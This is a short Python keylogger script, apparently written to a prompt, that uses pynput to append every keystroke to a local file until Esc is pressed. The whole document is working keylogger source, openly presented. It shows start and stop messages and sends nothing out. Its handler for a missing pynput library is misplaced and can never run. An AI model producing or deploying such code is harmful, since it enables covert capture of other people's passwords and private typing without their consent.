# Create a basic keylogger program that records and logs keystrokes.
# Focus on logging the keys pressed and saving them to a file.

from pynput import keyboard
LOG_File="keylog.text"
STOP_Key=keyboard.Key.esc

def log_key(key_data):
    try:
        with open(LOG_File,"a") as f:
            f.write(key_data)
    except Exception as e:
        print(f"ERROR : Not able to write in log file: {e}")

def onPress(key):
    try:
        char_to_log=key.char
        log_key(char_to_log)
    except AttributeError:
        if key==keyboard.Key.space:
            log_key(" ")
        elif key==keyboard.Key.enter:
            log_key("\n[ENTER]\n")
        elif key==keyboard.Key.tab:
            log_key("[TAB]")
        else:
            log_key(f'[{str(key).split(".")[-1].upper()}]')

def onRelease(key):
    if key==STOP_Key:
        print(f"\n[INFO] Keylogger stopped by user {STOP_Key.name.upper()} pressed\n")
        return False
    
if __name__=="__main__":
    try:
        print("Keylogger Started\n")
        print(f"Logging keystrokes to: ./{LOG_File}")
        print(f"PRESS {STOP_Key.name.upper()} KEY TO STOP")
        with keyboard.Listener(
            on_press=onPress,
            on_release=onRelease
        ) as listener:
            listener.join()
    except ImportError:
        print("\nERROR: The 'pynput' library is not installed.")
        print("Run : \"pip install pynput\"")
    except Exception as e:
        print(f"Unexpected Error Occured: {e}")